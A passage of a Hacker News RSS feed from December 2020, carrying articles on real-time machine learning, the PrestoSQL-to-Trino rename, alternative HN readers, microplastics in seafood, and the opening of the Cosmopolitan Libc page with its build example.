<p>In the two examples above, batch predictions lead to decreases in user experience (which is tightly coupled with user engagement/retention), not catastrophic failures. Other examples are ad ranking, Twitter‚Äôs trending hashtag ranking, Facebook‚Äôs newsfeed ranking, estimating time of arrival, etc.</p>

<p>There are also many applications that, without online predictions, would lead to catastrophic failures or just wouldn‚Äôt work. Examples include high frequency trading, autonomous vehicles, voice assistants, unlocking your phones using face/fingerprints, fall detection for elderly care, fraud detection, etc. Being able to detect a fraudulent transaction that happened 3 hours ago is still better than not detecting it at all, but being able to detect it in real-time can prevent it from going through.</p>

<p>Switching from batch predictions to real-time predictions allows you to use dynamic features to make more relevant predictions. Static features are information that changes slowly or rarely ‚Äì age, gender, job, neighborhood, etc. Dynamic features are features based on what‚Äôs happening right now ‚Äì what you‚Äôre watching, what you‚Äôve just liked, etc. Knowing a user‚Äôs interests right now will allow your systems to make recommendations much more relevant to them.</p>

<center>
<figure>
<img alt="MLOps over time" src="https://huyenchip.com/assets/pics/real-time-ml/2_google.png">
</figure>
</center>

<h3 id="online_predictions_solutions">Solutions</h3>
<p>For your system to be able to make online predictions, it has to have two components:</p>

<ol>
  <li>Fast inference: model that can make predictions in the order of milliseconds</li>
  <li>Real-time pipeline: a pipeline that can process data, input it into model, and return a prediction in real-time</li>
</ol>

<h4 id="fast_inference">Fast inference</h4>
<p>When a model is too big and taking too long to make predictions, there are three approaches:</p>

<p><b>1. Make models faster (inference optimization)</b></p>

<p>E.g. fusing operations, distributing computations, memory footprint optimization, writing high performance kernels targeting specific hardwares, etc.</p>

<p><b>2. Make models smaller (model compression)</b></p>

<p>Originally, this family of technique is to make models smaller to make them fit on edge devices. Making models smaller often makes them run faster. The most common, general technique for model compression is quantization, e.g. using 16-bit floats (half precision) or 8-bit integers (fixed-point) instead of 32-bit floats (full precision) to represent your model weights. In the extreme case, some have attempted 1-bit representation (binary weight neural networks), e.g. <a href="https://arxiv.org/abs/1511.00363">BinaryConnect</a> and <a href="https://arxiv.org/abs/1603.05279">Xnor-Net</a>. The authors of Xnor-Net spun off Xnor.ai, a startup focused on model compression which was <a href="https://www.geekwire.com/2020/exclusive-apple-acquires-xnor-ai-edge-ai-spin-paul-allens-ai2-price-200m-range/">acquired by Apple for a reported $200M</a>.</p>

<p>Another popular technique is <a href="https://arxiv.org/abs/1503.02531">knowledge distillation</a> ‚Äì a small model (student) is trained to mimic a larger model or an ensemble of models (teacher). Even though the student is often trained with a pre-trained teacher, both may also be trained at the same time. One example of a distilled network used in production is <a href="https://arxiv.org/abs/1910.01108"><strong>DistilBERT</strong></a>, which reduces the size of a BERT model by 40%, while retaining 97% of its language understanding capabilities and being 60% faster.</p>

<p>Other techniques include pruning (finding parameters least useful to predictions and setting them to 0) and low-rank factorization (replacing the over-parametric convolution filters with compact blocks to both reduce the number of parameters and increase speed). See <strong><a href="https://arxiv.org/abs/1710.09282">A Survey of Model Compression and Acceleration for Deep Neural Networks</a></strong> (Cheng et al.. 2017) for a detailed analysis.</p>

<p>The number of research papers on model compression is growing. Off-the-shelf utilities are proliferating. Awesome Open Source has a list of <a href="https://awesomeopensource.com/projects/model-compression"><strong>The Top 40 Model Compression Open Source Projects</strong></a>.</p>

<p><b>3. Make hardware faster</b></p>

<p>This is another research area that is booming. Big companies and startups alike are in a race to develop hardware that allows large ML models to do inference, even training, faster both on the cloud and especially on devices. IDC forecasts that by 2020, the combination of edge and mobile devices doing inferencing will <a href="https://www.arm.com/-/media/global/solutions/artificial-intelligence/ai-ml-on-cpu-whitepaper.pdf?revision=17a2b30b-0f5a-4a42-8681-3d9f3f94e513">total 3.7 billion units, with a further 116 million units doing training</a>.</p>

<h4 id="stream_pipeline">Real-time pipeline</h4>
<p>Suppose you have a ride sharing app and want to detect fraudulent transactions e.g. payments using stolen credit cards. When the true credit owner discovers unauthorized payments, they‚Äôll dispute with their bank and you‚Äôll have to refund the charges. To maximize profits, fraudsters might call multiple rides either in succession or from multiple accounts. In 2019, merchants estimate fraudulent transactions account for an average of <a href="https://network.americanexpress.com/globalnetwork/dam/jcr:09c34553-b4a2-43ca-bf3e-47cbc911ea51/American%20Express%202019%20Digital%20Payments%20Survey_Insights%20Paper.pdf">27% of their annual online sales</a>. The longer it takes for you to detect the stolen credit card, the more money you‚Äôll lose.</p>

<p>To detect whether a transaction is fraudulent, looking at that transaction alone isn‚Äôt enough. You need to at least look into the recent history of the user involved in that transaction, their recent trips and activities in-app, the credit card‚Äôs recent transactions, and other transactions happening around the same time.</p>

<p>To quickly access these types of information, you want to keep as much of them in-memory as possible. Every time an event you care about happens ‚Äì a user choosing a location, booking a trip, contacting a driver, canceling a trip, adding a credit card, removing a credit card, etc. ‚Äì information about that event goes into your in-memory storage. It stays there for as long as they are useful (usually in order of days) then either goes into permanent storage (e.g. S3) or is discarded. The most common tool for this is <a href="https://github.com/apache/kafka">Apache Kafka</a>, with alternatives such as Amazon Kinesis. Kafka is a stream storage: it stores data as it streams.</p>

<p>Streaming data is different from static data ‚Äì data that already exists somewhere in its entirety, such as CSV files. When reading from CSV files, you know when the job is finished. Streams of data never finish.</p>

<p>Once you‚Äôve had a way to manage streaming data, you want to extract features to input into your ML models. On top of features from streaming data, you might also need features from static data (when was this account created, what‚Äôs the user‚Äôs rating, etc.). You need a tool that allows you to process streaming data as well as static data and join ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://huyenchip.com/2020/12/27/real-time-machine-learning.html">https://huyenchip.com/2020/12/27/real-time-machine-learning.html</a></em></p>]]>
            </description>
            <link>https://huyenchip.com/2020/12/27/real-time-machine-learning.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557412</guid>
            <pubDate>Mon, 28 Dec 2020 07:21:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We‚Äôre Rebranding PrestoSQL as Trino]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557321">thread link</a>) | @addisonj
<br/>
December 27, 2020 | https://trino.io/blog/2020/12/27/announcing-trino.html | <a href="https://web.archive.org/web/*/https://trino.io/blog/2020/12/27/announcing-trino.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>We‚Äôre rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren‚Äôt 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto¬Æ along with the major contributors ‚Äì just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>
  <li>Twitter: <a href="https://twitter.com/trinodb">@trinodb</a></li>
  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we‚Äôre doing this, read on‚Ä¶</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto¬Æ to address the problems of low latency interactive analytics over Facebook‚Äôs massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto¬Æ to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto¬Æ community. Presto¬Æ was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto¬Æ. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto¬Æ community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto¬Æ continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don‚Äôt take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation¬Æ. As a first 
action, Facebook applied for a trademark on Presto¬Æ. This was a surprising, norm-breaking move because up until that point, 
the Presto¬Æ name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation¬Æ, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto¬Æ in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto¬Æ, we have come to accept that a 
name is just a name. To be frank, we‚Äôre tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing ‚Äì building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We‚Äôre not going anywhere ‚Äì we‚Äôre the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ‚ù§Ô∏è</strong></p>


<p>Facebook is a registered trademark of Facebook Inc.  The Linux Foundation and Presto are trademarks of The Linux Foundation.</p>


  </div>

  
</article>

</div></div>]]>
            </description>
            <link>https://trino.io/blog/2020/12/27/announcing-trino.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557321</guid>
            <pubDate>Mon, 28 Dec 2020 06:55:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HN Alternative UIs]]>
            </title>
            <description>
<![CDATA[
Score 150 | Comments 106 (<a href="https://news.ycombinator.com/item?id=25556990">thread link</a>) | @lgats
<br/>
December 27, 2020 | https://blog.luke.lol/tech/hacker-news-alternatives/ | <a href="https://web.archive.org/web/*/https://blog.luke.lol/tech/hacker-news-alternatives/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<h2>News.YCombinator.com Readers</h2>
<p>Ranked by Alexa popularity.</p>
<p><a href="https://hn.algolia.com/">hn.algolia.com</a><br>
HackerNews with a search function and 16.8+ million posts indexed.<br>
Alexa: 8.7k</p>
<p><a href="http://popurls.com/">popurls.com</a><br>
Several news sites combined into a single newspaper-like feed<br>
Alexa: 87k</p>
<p><a href="https://upstract.com/">upstract.com</a><br>
News aggregator with paid features, includes HN<br>
Alexa: 137k</p>
<p><a href="https://hckrnews.com/">hckrnews.com</a><br>
HN posts organized by rolling, quarter-daily timeslots.<br>
Alexa: 178k</p>
<p><a href="https://pxlet.com/">pxlet.com</a><br>
Culmination of HN, Reddit, SlashDot, and other Tech-News Sites<br>
Alexa: 330k</p>
<p><a href="https://hackernewsletter.com/">hackernewsletter.com</a><br>
HN delivered via email<br>
Alexa: 581k</p>
<p><a href="https://old.thenews.im/">thenews.im&nbsp;</a><br>
Designer News, Product Hunt and Hacker News Mashup with easy-access to individual feeds<br>
Alexa: 960k</p>
<p><a href="http://www.daemonology.net/hn-daily/">daemonology.net</a><br>
Daily list of the top HN posts.<br>
Alexa: 971k</p>
<p><a href="http://n-gate.com/%3En-gate.com%3C/a%3E%3Cbr%20/%3EA%20weekly%20[human?]%20annotated%20digest%20of%20the%20top%20%E2%80%9CHacker%E2%80%9D%20%E2%80%9CNews%E2%80%9D%20posts%3Cbr%20/%3EAlexa:%202.5m%3C/p%3E%3Cp%3E%3Ca%20href=" https:="" hn.premii.com"="">hn.premii.com</a><br>
HN Mirror integrated with an on-page reader<br>
Alexa: 3m</p>
<p><a href="http://hnrankings.info/">hnrankings.info</a><br>
HN Ranking Charts<br>
Alexa: 4m</p>
<p><a href="https://hnews.xyz/">hnews.xyz</a><br>
HN Mirror with Webpage Screenshots [similar to tiledhn.com (<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">RIP</a>)]<br>
Alexa: 5m</p>
<p><a href="https://hnsince.com/">hnsince.com</a><br>
Top HN posts since you last visited<br>
Alexa: 5.4m</p>
<p><a href="https://hackerweb.app/">hackerweb.app</a><br>
More mobile-friendly HN<br>
Alexa: 6.3m</p>
<p><a href="https://fullhn.com/">fullhn.com</a><br>
Front page of HN in a single page loaded with all articles. Great for loading up before you jump on a flight without wireless access.<br>
Alexa: 7m</p>
<p><a href="https://hackurls.com/">hackurls.com</a><br>
HN, proggit, reddit, toptal, hackaday, slashdot, techmeme, wired as separate feeds on a single page<br>
Alexa: 8.5m</p>
<p><a href="https://hackernewsmobile.com/">hackernewsmobile.com</a><br>
More mobile-friendly HN<br>
Alexa: 9.5m</p>
<p><a href="https://lopespm.github.io/hackernews-daily/">lopespm HN Daily</a><br>
HackerNews Daily ‚Äì Culmination of top posts for the day<br>
Alexa: Unavailable</p>
<p><a href="https://www.wolfgangfaust.com/project/paper-hn/">wolfgangfaust HN Newspaper</a><br>
Newspaper themed HN<br>
Alexa: Unavailable</p>
<p><a href="https://thn.rakhim.org/">thn.rakhim.org</a><br>
30 random good HN posts from the past<br>
Alexa: Unavailable</p>
<p><a href="https://zvoid.org/hn">zvoid.org/hn</a><br>
Dark-themed HN reader<br>
Alexa: Unavailable</p>
<p><a href="https://hn.svelte.dev/">hn.svelte.dev</a><br>
mobile and dark mode friendly reader for HN<br>
Alexa: None</p>
<p><a href="https://hackernews.betacat.io/">hackernews.betacat.io</a><br>
Modern HN theme with website preview screenshots<br>
Alexa: None</p>
<p><a href="https://read.hn/">read.hn</a><br>
Another HN Reader view<br>
Alexa: None</p>
<p><a href="https://hnapp.com/">hnapp.com</a><br>
HN Advanced Search and monitoring tool<br>
Alexa: None</p>
<p><a href="http://hnpaper.forge.partlab.io/">hnpaper.forge.partlab.io</a><br>
HNPaper ‚Äì bootstrap theme simple HN interface<br>
Alexa: Unavailable</p>
<p><a href="https://hack.ernews.info/">hack.ernews.info</a><br>
More mobile-friendly HN<br>
Alexa: None</p>
<p><a href="https://progscrape.com/">progscrape.com</a><br>
HN, Reddit, and Lobste.rs aggregated and merged into a single feed<br>
Alexa: None</p>
<p><a href="http://hn.elijames.org/">hn.elijames.org</a><br>
‚ÄúLess annoying hacker news‚Äù with an even simpler interface<br>
Alexa: None</p>
<p><a href="http://serializer.io/">seralizer.io</a><br>
HN + Related Subreddits + Lobsters + Mac Rumors + Arstechnica<br>
Alexa: None</p>
<p><a href="https://nerdmash.com/">nerdmash.com</a><br>
A nerd‚Äôs daily read. Top posts from every nerdy content aggregator.<br>
Alexa: None</p>
<h2>Other Tweaks / Interfaces</h2>
<p><a href="https://old.reddit.com/r/hackernews/">/r/hackernews</a><br>
Subreddit for HN<br>
51,450 readers</p>
<p><a href="https://hnreplies.com/">hnreplies.com</a><br>
Emails on replies to your comments<br>
Alexa: 3.2m</p>
<p><a href="https://apps.apple.com/us/app/id1308885491">Octal iOS App</a><br>
Full-featured HN client with support for posting/voting/comments ‚Äì iOS only.<br>
4.8/5.0 ‚Äì 1K Ratings</p>
<p><a href="https://hnrss.github.io/">hnrss.github.io</a><br>
HN RSS Feed<br>
Alexa: None</p>
<p><a href="https://hackerne.ws/">hackerne.ws</a><br>
HN Short Link ‚Äì redirects to https://news.ycombinator.com<br>
Alexa: None</p>
<p><a href="https://chrome.google.com/webstore/detail/hacker-news-ux/chngbdmhgakoomomnnhfapkpbalpmhid">Hacker News UX</a><br>
Chrome Extension for Improved UI<br>
356 users</p>
<p><a href="https://f5bot.com/">f5bot.com</a><br>
Reddit / HN / Lobsters keyword mention watch tool.<br>
Alexa: 1.1m</p>

<h2>Graveyard</h2>
<p>hackermonthly.com [<a href="https://web.archive.org/web/20160731192600/http://hackermonthly.com/">defunct</a>]<br>
HN in print</p>
<p>quiethn.com [<a href="https://web.archive.org/web/20171001013212/https://quiethn.com/">defunct</a>]<br>
HN with less clutter </p>
<p>hackerblogs.com [<a href="https://web.archive.org/web/20110204021331/http://www.hackerblogs.com/">defunct</a>]<br>
2011-era mobile view</p>
<p>hackernews.im [defunct]<br>
now <a href="https://hackernews.betacat.io/">hackernews.betacat.io</a></p>
<p>tiledhn.com [<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">defunct</a>]<br>
Windows 8-type view for HN</p>
<p>hackerbra.in [<a href="https://web.archive.org/web/20181105131330/http://hackerbra.in/">defunct</a>]<br>
HN with inline top comments </p>
<p>hnwatcher.com [<a href="https://web.archive.org/web/20201125052525/https://www.hnwatcher.com/">defunct</a>]<br>
user/keyword email notification service</p>
<p>hnmobile.herokuapp.com [<a href="https://web.archive.org/web/20180601000346/http://hnmobile.herokuapp.com/">defunct</a>]<br>
HN mobile friendly mirror</p>
<p>hackernewsemail.com [<a href="https://web.archive.org/web/20180826215821/https://hackernewsemail.com/">defunct</a>]<br>
Daily email for posts with minimum set number of points</p>
<p>hacker-newspaper.gilesb.com [<a href="https://web.archive.org/web/20180402131152/https://news.ycombinator.com/">defunct</a>]<br>
HN Mirror</p>
<p>react-hn.appspot.com [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror</p>
<p>hackeroo.co [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror </p>
</div></div>]]>
            </description>
            <link>https://blog.luke.lol/tech/hacker-news-alternatives/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556990</guid>
            <pubDate>Mon, 28 Dec 2020 05:37:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study Demonstrates Seafood Contains the Heaviest Amount of Microplastics]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25556589">thread link</a>) | @voldemort1968
<br/>
December 27, 2020 | https://smosa.com/study-discovers-seafood-carries-the-most-microplastic/ | <a href="https://web.archive.org/web/*/https://smosa.com/study-discovers-seafood-carries-the-most-microplastic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>In a review <a href="https://ehp.niehs.nih.gov/doi/full/10.1289/EHP7171">published in Environmental Health Perspectives</a>, Microplastics (MPs) are laid out as a serious problem in the marine environment as well as human food consumption.</p><p>The study analyzed 69 experiments across mollusks, crustaceans, fish and echinodermata. The data show that seafood is a major cause of human exposure to MPs. Levels of MP contamination vary significantly in different phylum of organisms. </p><p>Microplastics are tiny pieces of any kind of plastic found in the environment less than 5mm long according to NOAA and the European Chemicals Agency. They often end up in nature from cosmetics, clothing, and industrial processes.</p><figure><img src="https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Plastic (PET) bottles collected from the river Tisza. They are ready to be transported and recycled." srcset="https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1598557928058-3e432c97dc85?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDN8fG1pY3JvcGxhc3RpY3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@mihaly_koles?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Mih√°ly K√∂les</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Two classifications of microplastics exist. Primary microplastics are smaller than 5mm. Polyester, nylon, and rayon fibers are also present (also known as nurdles). Secondary microplastics come from the micro degradation of larger plastic particles after their entrance into the environment through natural weathering processes.</p><p>"No-one yet fully understands the full impact of microplastics on the human body, but early evidence from other studies suggest they do cause harm." said study author, Evangelos Danopoulos, a postgraduate student at Hull York Medical School in an <a href="https://www.sciencedaily.com/releases/2020/12/201223091547.htm">article from Science Daily</a>.</p><p>"A critical step in understanding the full impact on human consumption is in first fully establishing what levels of microplastics humans are ingesting. We can start to do this by looking at how much seafood and fish is eaten and measuring the amount of MPs in these creatures."</p><figure><img src="https://smosa.com/content/images/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png" alt="" srcset="https://smosa.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 600w, https://smosa.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 1000w, https://smosa.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 1600w, https://smosa.com/content/images/2020/12/Screen-Shot-2020-12-22-at-2_38_24-PM-1.png 1962w" sizes="(min-width: 720px) 720px"><figcaption>Source: <a href="https://pubs.acs.org/doi/abs/10.1021/acs.est.9b01517">American Chemical Society; Expert(s) (Cox et al)</a></figcaption></figure><p>The study concludes that there needs to be harmonization and standardization of methods and procedures.</p><!--kg-card-begin: html--><p><a href="https://twitter.com/smosadotcom?ref_src=twsrc%5Etfw" data-show-count="false">Follow @smosadotcom</a></p><!--kg-card-end: html-->
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article></div>]]>
            </description>
            <link>https://smosa.com/study-discovers-seafood-carries-the-most-microplastic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556589</guid>
            <pubDate>Mon, 28 Dec 2020 04:07:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cosmopolitan Libc: build-once run-anywhere C library]]>
            </title>
            <description>
<![CDATA[
Score 560 | Comments 158 (<a href="https://news.ycombinator.com/item?id=25556286">thread link</a>) | @pantalaimon
<br/>
December 27, 2020 | https://justine.lol/cosmopolitan/index.html | <a href="https://web.archive.org/web/*/https://justine.lol/cosmopolitan/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header>
  <img width="196" height="105" src="https://storage.googleapis.com/justine/cosmopolitan/cosmopolitan.png" title="cosmopolitan honeybadger" alt="honeybadger">
  
  <span>build-once run-anywhere c without devops</span>
</header>

<nav>
  <ul>
    <li><a href="https://justine.lol/cosmopolitan/index.html">Intro</a>
    </li><li><a href="https://justine.lol/cosmopolitan/download.html">Download</a>
    </li><li><a href="https://justine.lol/cosmopolitan/documentation.html">Documentation</a>
    </li><li><a href="https://justine.lol/cosmopolitan/sources.html">Sources</a>
    </li><li><a href="https://github.com/jart/cosmopolitan">GitHub</a>
    </li><li><a href="https://justine.lol/cosmopolitan/license.html">License</a>
    </li><li><a href="https://justine.lol/index.html">¬ª jart's web page</a>
  </li></ul>
</nav>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">Œ±cœÑ¬µŒ±lly pŒ¥rœÑŒ±blŒµ ŒµxŒµc¬µœÑŒ±blŒµ</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
